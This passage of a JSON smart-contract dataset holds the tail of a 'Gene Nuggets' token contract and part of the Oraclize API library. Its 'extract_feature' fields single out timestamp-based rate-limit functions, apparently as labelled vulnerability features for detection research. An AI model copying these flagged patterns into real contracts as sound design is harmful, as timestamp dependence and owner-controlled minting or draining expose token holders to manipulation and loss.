\"Gene Nuggets\";\n string public symbol = \"GNUS\";\n uint8 public decimals = 6;\n uint256 public decimalFactor = 10 ** uint256(decimals);\n uint public CAP = 30e8 * decimalFactor;\n uint256 public circulatingSupply;\n uint256 public totalUsers;\n uint256 public exchangeLimit = 10000*decimalFactor;\n uint256 public exchangeThreshold = 2000*decimalFactor;\n uint256 public exchangeInterval = 60;\n uint256 public destroyThreshold = 100*decimalFactor;\n address public CFO;\n mapping(address => uint256) public CustomerService;\n uint[10] public MINING_LAYERS = [0,10e4,30e4,100e4,300e4,600e4,1000e4,2000e4,3000e4,2**256 - 1];\n uint[9] public MINING_REWARDS = [1000*decimalFactor,600*decimalFactor,300*decimalFactor,200*decimalFactor,180*decimalFactor,160*decimalFactor,60*decimalFactor,39*decimalFactor,0];\n event UpdateTotal(uint totalUser,uint totalSupply);\n event Exchange(address indexed user,uint256 amount);\n event Destory(address indexed user,uint256 amount);\n modifier onlyCFO() {\n require(msg.sender == CFO);\n _;\n }\n modifier onlyCustomerService() {\n require(CustomerService[msg.sender] != 0);\n _;\n }\n function GeneNuggetsToken() public {}\n function() public {\n revert();\n }\n function setName(string newName) external onlyOwner {\n name = newName;\n }\n function setSymbol(string newSymbol) external onlyOwner {\n symbol = newSymbol;\n }\n function setCFO(address newCFO) external onlyOwner {\n CFO = newCFO;\n }\n function setExchangeInterval(uint newInterval) external onlyCFO {\n exchangeInterval = newInterval;\n }\n function setExchangeLimit(uint newLimit) external onlyCFO {\n exchangeLimit = newLimit;\n }\n function setExchangeThreshold(uint newThreshold) external onlyCFO {\n exchangeThreshold = newThreshold;\n }\n function setDestroyThreshold(uint newThreshold) external onlyCFO {\n destroyThreshold = newThreshold;\n }\n function addCustomerService(address cs) onlyCFO external {\n CustomerService[cs] = block.timestamp;\n }\n function removeCustomerService(address cs) onlyCFO external {\n CustomerService[cs] = 0;\n }\n function updateTotal(uint256 _userAmount) onlyCFO external {\n require(_userAmount>totalUsers);\n uint newTotalSupply = calTotalSupply(_userAmount);\n require(newTotalSupply<=CAP && newTotalSupply>totalSupply_);\n uint _amount = newTotalSupply.sub(totalSupply_);\n totalSupply_ = newTotalSupply;\n totalUsers = _userAmount;\n emit UpdateTotal(_amount,totalSupply_);\n }\n function calTotalSupply(uint _userAmount) private view returns (uint ret) {\n uint tokenAmount = 0;\n for (uint8 i = 0; i < MINING_LAYERS.length ; i++ ) {\n if(_userAmount < MINING_LAYERS[i+1]) {\n tokenAmount = tokenAmount.add(MINING_REWARDS[i].mul(_userAmount.sub(MINING_LAYERS[i])));\n break;\n }else {\n tokenAmount = tokenAmount.add(MINING_REWARDS[i].mul(MINING_LAYERS[i+1].sub(MINING_LAYERS[i])));\n }\n }\n return tokenAmount;\n }\n function exchange(address user,uint256 _amount) whenNotPaused onlyCustomerService external {\n require((block.timestamp-CustomerService[msg.sender])>exchangeInterval);\n require(_amount <= exchangeLimit && _amount >= exchangeThreshold);\n circulatingSupply = circulatingSupply.add(_amount);\n balances[user] = balances[user].add(_amount);\n CustomerService[msg.sender] = block.timestamp;\n emit Exchange(user,_amount);\n emit Transfer(address(0),user,_amount);\n }\n function destory(uint256 _amount) external {\n require(balances[msg.sender]>=_amount && _amount>destroyThreshold && circulatingSupply>=_amount);\n circulatingSupply = circulatingSupply.sub(_amount);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n emit Destory(msg.sender,_amount);\n emit Transfer(msg.sender,0x0,_amount);\n }\n function emergencyERC20Drain( ERC20 token, uint amount ) onlyOwner external {\n token.transfer( owner, amount );\n }\n}",
  "extract_feature": [
    "function addCustomerService(address cs) onlyCFO external {\nCustomerService[cs] = block.timestamp;\n}",
    "function exchange(address user,uint256 _amount) whenNotPaused onlyCustomerService external {\nrequire((block.timestamp-CustomerService[msg.sender])>exchangeInterval);\nrequire(_amount <= exchangeLimit && _amount >= exchangeThreshold);\ncirculatingSupply = circulatingSupply.add(_amount);\nbalances[user] = balances[user].add(_amount);\nCustomerService[msg.sender] = block.timestamp;\nemit Exchange(user,_amount);\nemit Transfer(address(0),user,_amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f87"
  },
  "filename": "9483.sol",
  "content": "pragma solidity ^0.4.18;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) external payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) external payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) public payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) external payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) public payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) external payable returns (bytes32 _id);\n function getPrice(string _datasource) public returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);\n function setProofType(byte _proofType) external;\n function setCustomGasPrice(uint _gasPrice) external;\n function randomDS_getSessionPubKeyHash() external constant returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() public returns (address _addr);\n}\nlibrary Buffer {\n struct buffer {\n bytes buf;\n uint capacity;\n }\n function init(buffer memory buf, uint capacity) internal pure {\n if(capacity % 32 != 0) capacity += 32 - (capacity % 32);\n buf.capacity = capacity;\n assembly {\n let ptr := mload(0x40)\n mstore(buf, ptr)\n mstore(0x40, add(ptr, capacity))\n }\n }\n function resize(buffer memory buf, uint capacity) private pure {\n bytes memory oldbuf = buf.buf;\n init(buf, capacity);\n append(buf, oldbuf);\n }\n function max(uint a, uint b) private pure returns(uint) {\n if(a > b) {\n return a;\n }\n return b;\n }\n function append(buffer memory buf, bytes data) internal pure returns(buffer memory) {\n if(data.length + buf.buf.length > buf.capacity) {\n resize(buf, max(buf.capacity, data.length) * 2);\n }\n uint dest;\n uint src;\n uint len = data.length;\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n dest := add(add(bufptr, buflen), 32)\n mstore(bufptr, add(buflen, mload(data)))\n src := add(data, 32)\n }\n for(; len >= 32; len -= 32) {\n assembly {\n mstore(dest, mload(src))\n }\n dest += 32;\n src += 32;\n }\n uint mask = 256 ** (32 - len) - 1;\n assembly {\n let srcpart := and(mload(src), not(mask))\n let destpart := and(mload(dest), mask)\n mstore(dest, or(destpart, srcpart))\n }\n return buf;\n }\n function append(buffer memory buf, uint8 data) internal pure {\n if(buf.buf.length + 1 > buf.capacity) {\n resize(buf, buf.capacity * 2);\n }\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n let dest := add(add(bufptr, buflen), 32)\n mstore8(dest, data)\n mstore(bufptr, add(buflen, 1))\n }\n }\n function appendInt(buffer memory buf, uint data, uint len) internal pure returns(buffer memory) {\n if(len + buf.buf.length > buf.capacity) {\n resize(buf, max(buf.capacity, len) * 2);\n }\n uint mask = 256 ** len - 1;\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n let dest := add(add(bufptr, buflen), len)\n mstore(dest, or(and(mload(dest), not(mask)), data))\n mstore(bufptr, add(buflen, len))\n }\n return buf;\n }\n}\nlibrary CBOR {\n using Buffer for Buffer.buffer;\n uint8 private constant MAJOR_TYPE_INT = 0;\n uint8 private constant MAJOR_TYPE_NEGATIVE_INT = 1;\n uint8 private constant MAJOR_TYPE_BYTES = 2;\n uint8 private constant MAJOR_TYPE_STRING = 3;\n uint8 private constant MAJOR_TYPE_ARRAY = 4;\n uint8 private constant MAJOR_TYPE_MAP = 5;\n uint8 private constant MAJOR_TYPE_CONTENT_FREE = 7;\n function encodeType(Buffer.buffer memory buf, uint8 major, uint value) private pure {\n if(value <= 23) {\n buf.append(uint8((major << 5) | value));\n } else if(value <= 0xFF) {\n buf.append(uint8((major << 5) | 24));\n buf.appendInt(value, 1);\n } else if(value <= 0xFFFF) {\n buf.append(uint8((major << 5) | 25));\n buf.appendInt(value, 2);\n } else if(value <= 0xFFFFFFFF) {\n buf.append(uint8((major << 5) | 26));\n buf.appendInt(value, 4);\n } else if(value <= 0xFFFFFFFFFFFFFFFF) {\n buf.append(uint8((major << 5) | 27));\n buf.appendInt(value, 8);\n }\n }\n function encodeIndefiniteLengthType(Buffer.buffer memory buf, uint8 major) private pure {\n buf.append(uint8((major << 5) | 31));\n }\n function encodeUInt(Buffer.buffer memory buf, uint value) internal pure {\n encodeType(buf, MAJOR_TYPE_INT, value);\n }\n function encodeInt(Buffer.buffer memory buf, int value) internal pure {\n if(value >= 0) {\n encodeType(buf, MAJOR_TYPE_INT, uint(value));\n } else {\n encodeType(buf, MAJOR_TYPE_NEGATIVE_INT, uint(-1 - value));\n }\n }\n function encodeBytes(Buffer.buffer memory buf, bytes value) internal pure {\n encodeType(buf, MAJOR_TYPE_BYTES, value.length);\n buf.append(value);\n }\n function encodeString(Buffer.buffer memory buf, string value) internal pure {\n encodeType(buf, MAJOR_TYPE_STRING, bytes(value).length);\n buf.append(bytes(value));\n }\n function startArray(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_ARRAY);\n }\n function startMap(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_MAP);\n }\n function endSequence(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_CONTENT_FREE);\n }\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0))\n oraclize_setNetwork(networkID_auto);\n if(address(oraclize) != OAR.getAddress())\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n return oraclize_setNetwork();\n networkID;\n }\n function oraclize_setNetwork() internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) public {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) public {\n return;\n myid; result; proof;\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal pure returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += 